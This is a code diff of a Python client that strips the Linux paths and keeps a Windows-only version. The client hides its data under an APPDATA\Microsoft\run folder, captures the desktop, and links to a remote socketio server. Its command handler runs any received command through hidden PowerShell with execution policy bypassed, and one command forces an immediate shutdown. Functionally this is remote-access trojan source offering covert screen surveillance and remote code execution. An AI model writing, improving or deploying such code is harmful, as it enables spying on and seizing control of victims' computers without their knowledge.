@@ -2,33 +2,20 @@ import os
 import sys
 import time
 import io
-import re
 import base64
 import threading
 import subprocess
-import shutil
+import ctypes
 from typing import Optional
 from PIL import ImageGrab, Image
 import socketio
 
-IS_WINDOWS = sys.platform == "win32"
+# ── Single Instance Enforcement (Windows Mutex) ──
 
-# ── Single Instance Enforcement ──
-
-if IS_WINDOWS:
-    import ctypes
-    kernel32 = ctypes.windll.kernel32
-    mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
-    if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
-        sys.exit(0)
-else:
-    import socket
-    try:
-        # Abstract namespace domain socket (Linux specific, auto-cleaned on process exit)
-        _lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-        _lock_socket.bind("\0run_py_mutex")
-    except (socket.error, OSError):
-        sys.exit(0)
+kernel32 = ctypes.windll.kernel32
+mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
+if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+    sys.exit(0)
 
 # ── Server Configuration & Client ID ──
 
@@ -43,39 +30,12 @@ except ImportError:
     CLIENT_KEY = ""
     CLIENT_VERSION = "dev"
 
-if IS_WINDOWS:
-    app_data = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
-    data_dir = os.path.join(app_data, "Microsoft", "run")
-    ID_PATH = os.path.join(data_dir, "run.txt")
-    DAT_PATH = os.path.join(data_dir, "run.dat")
-    raw_user = os.getenv("USERNAME", "user")
-    os_suffix = "W"
-else:
-    xdg_data = os.getenv("XDG_DATA_HOME") or os.path.expanduser("~/.local/share")
-    data_dir = os.path.join(xdg_data, "run")
-    ID_PATH = os.path.join(data_dir, "run.txt")
-    DAT_PATH = os.path.join(data_dir, "run.dat")
-    raw_user = os.getenv("USER") or os.getenv("LOGNAME")
-    if not raw_user:
-        try:
-            import getpass
-            raw_user = getpass.getuser()
-        except Exception:
-            raw_user = "user"
-    os_suffix = "L"
-
-    # Ensure display environment variables are present for terminal launchers & screen grabbers
-    if "DISPLAY" not in os.environ and os.path.exists("/tmp/.X11-unix"):
-        for d in [":0", ":1"]:
-            if os.path.exists(f"/tmp/.X11-unix/X{d[1:]}"):
-                os.environ["DISPLAY"] = d
-                break
-    if "WAYLAND_DISPLAY" not in os.environ:
-        runtime_dir = os.environ.get("XDG_RUNTIME_DIR") or f"/run/user/{os.getuid()}"
-        for w in ["wayland-0", "wayland-1"]:
-            if os.path.exists(os.path.join(runtime_dir, w)):
-                os.environ["WAYLAND_DISPLAY"] = w
-                break
+app_data = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
+data_dir = os.path.join(app_data, "Microsoft", "run")
+ID_PATH = os.path.join(data_dir, "run.txt")
+DAT_PATH = os.path.join(data_dir, "run.dat")
+raw_user = os.getenv("USERNAME", "user")
+os_suffix = "W"
 
 if os.path.exists(DAT_PATH):
     try:
@@ -100,49 +60,6 @@ else:
 
 unique_user = f"{raw_user}-{unique_id}-{os_suffix}"
 
-# ── Pre-compiled Regular Expressions ──
-
-RE_SPEAK = re.compile(r"Speak\((.+?)\)")
-RE_POPUP = re.compile(r"Popup\((.+?)\)")
-RE_PS_CMD = re.compile(
-    r"^\s*(powershell|pwsh)|(Read-Host|Write-Host|Get-|Set-|New-|Start-|Stop-|Invoke-|\$env:)",
-    re.IGNORECASE,
-)
-
-# ── Cached Linux Environment Helpers ──
-
-TERMINAL_EMULATORS = [
-    "x-terminal-emulator",
-    "gnome-terminal",
-    "ptyxis",
-    "kgx",
-    "konsole",
-    "xfce4-terminal",
-    "alacritty",
-    "kitty",
-    "foot",
-    "tilix",
-    "terminator",
-    "qterminal",
-    "xterm",
-]
-
-_detected_terminal: Optional[str] = None
-_terminal_detection_done: bool = False
-
-
-def get_default_terminal() -> Optional[str]:
-    """Detect and cache available Linux terminal emulator."""
-    global _detected_terminal, _terminal_detection_done
-    if not _terminal_detection_done:
-        for t in TERMINAL_EMULATORS:
-            if shutil.which(t):
-                _detected_terminal = t
-                break
-        _terminal_detection_done = True
-    return _detected_terminal
-
-
 # ── SocketIO Client Initialization ──
 
 sio = socketio.Client(reconnection=True, reconnection_delay=2)
@@ -152,70 +69,11 @@ capture_thread = None
 
 
 def grab_screen() -> Optional[Image.Image]:
-    """Capture desktop screenshot across Windows and Linux (Wayland / X11)."""
-    # 1. Native Pillow ImageGrab
+    """Capture desktop screenshot via Pillow ImageGrab."""
     try:
-        img = ImageGrab.grab()
-        if img:
-            return img
+        return ImageGrab.grab()
     except Exception:
-        pass
-
-    # 2. Linux Wayland / X11 fallbacks
-    if not IS_WINDOWS:
-        if os.getenv("WAYLAND_DISPLAY") and shutil.which("grim"):
-            try:
-                proc = subprocess.run(
-                    ["grim", "-t", "jpeg", "-"],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.DEVNULL,
-                    timeout=3,
-                )
-                if proc.returncode == 0 and proc.stdout:
-                    return Image.open(io.BytesIO(proc.stdout))
-            except Exception:
-                pass
-
-        for bin_name, cmd in [
-            ("scrot", ["scrot", "-z", "-o", "/dev/stdout"]),
-            ("maim", ["maim", "-f", "jpeg"]),
-            ("import", ["import", "-window", "root", "jpeg:-"]),
-        ]:
-            if shutil.which(bin_name):
-                try:
-                    proc = subprocess.run(
-                        cmd,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.DEVNULL,
-                        timeout=3,
-                    )
-                    if proc.returncode == 0 and proc.stdout:
-                        return Image.open(io.BytesIO(proc.stdout))
-                except Exception:
-                    pass
-
-        # GNOME Wayland / X11 fallback
-        if shutil.which("gnome-screenshot"):
-            tmp_path = "/tmp/_run_screen.png"
-            try:
-                proc = subprocess.run(
-                    ["gnome-screenshot", "-f", tmp_path],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    timeout=3,
-                )
-                if proc.returncode == 0 and os.path.exists(tmp_path):
-                    with open(tmp_path, "rb") as f:
-                        data = f.read()
-                    try:
-                        os.remove(tmp_path)
-                    except Exception:
-                        pass
-                    return Image.open(io.BytesIO(data))
-            except Exception:
-                pass
-
-    return None
+        return None
 
 
 def capture_loop():
@@ -290,106 +148,30 @@ def on_exec_command(data):
     if "panic" in decoded_cmd.lower():
         sys.exit(0)
     elif "altf4" in decoded_cmd.lower():
-        if IS_WINDOWS:
-            subprocess.Popen(
-                ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
-            )
-        else:
-            subprocess.Popen(["systemctl", "poweroff"])
+        subprocess.Popen(
+            ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
+        )
         return
 
     cmd_str = decoded_cmd.strip()
 
-    if IS_WINDOWS:
-        creation_flags = (
-            subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
-        )
-        if cmd_str.lower().startswith("powershell"):
-            subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
-        else:
-            subprocess.Popen(
-                [
-                    "powershell.exe",
-                    "-NoProfile",
-                    "-ExecutionPolicy",
-                    "Bypass",
-                    "-Command",
-                    cmd_str,
-                ],
-                creationflags=creation_flags,
-            )
-        return
-
-    # POSIX / Arch Linux execution
-    if "SAPI.SpVoice" in cmd_str:
-        m = RE_SPEAK.search(cmd_str)
-        text = m.group(1).strip("'\"") if m else "Notification"
-        subprocess.Popen(
-            f'spd-say "{text}" 2>/dev/null || espeak "{text}" 2>/dev/null',
-            shell=True,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            start_new_session=True,
-        )
-        return
-
-    if "WScript.Shell" in cmd_str and "Popup" in cmd_str:
-        m = RE_POPUP.search(cmd_str)
-        text = m.group(1).strip("'\"") if m else "Message"
-        subprocess.Popen(
-            f'notify-send "Run Alert" "{text}" 2>/dev/null || zenity --info --text="{text}" 2>/dev/null',
-            shell=True,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            start_new_session=True,
-        )
-        return
-
-    pwsh_bin = shutil.which("pwsh") or shutil.which("powershell")
-    use_pwsh = bool(pwsh_bin and RE_PS_CMD.search(cmd_str))
-
-    if visible:
-        term = get_default_terminal()
-        if term:
-            if term in ["gnome-terminal", "xfce4-terminal", "ptyxis", "tilix"]:
-                term_args = (
-                    [term, "--", pwsh_bin, "-NoExit", "-Command", cmd_str]
-                    if use_pwsh
-                    else [term, "--", "bash", "-c", f"{cmd_str}; exec bash"]
-                )
-            else:
-                term_args = (
-                    [term, "-e", pwsh_bin, "-NoExit", "-Command", cmd_str]
-                    if use_pwsh
-                    else [term, "-e", "bash", "-c", f"{cmd_str}; exec bash"]
-                )
-            subprocess.Popen(term_args, start_new_session=True)
-        else:
-            cmd_args = (
-                [pwsh_bin, "-NoProfile", "-Command", cmd_str]
-                if use_pwsh
-                else ["bash", "-c", cmd_str]
-            )
-            subprocess.Popen(cmd_args, stdin=subprocess.DEVNULL, start_new_session=True)
+    creation_flags = (
+        subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
+    )
+    if cmd_str.lower().startswith("powershell"):
+        subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
     else:
-        if use_pwsh:
-            subprocess.Popen(
-                [pwsh_bin, "-NoProfile", "-NonInteractive", "-Command", cmd_str],
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                start_new_session=True,
-            )
-        else:
-            subprocess.Popen(
-                ["bash", "-c", cmd_str],
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                start_new_session=True,
-            )
+        subprocess.Popen(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-Command",
+                cmd_str,
+            ],
+            creationflags=creation_flags,
+        )
 
 
 @sio.on("set_capture")
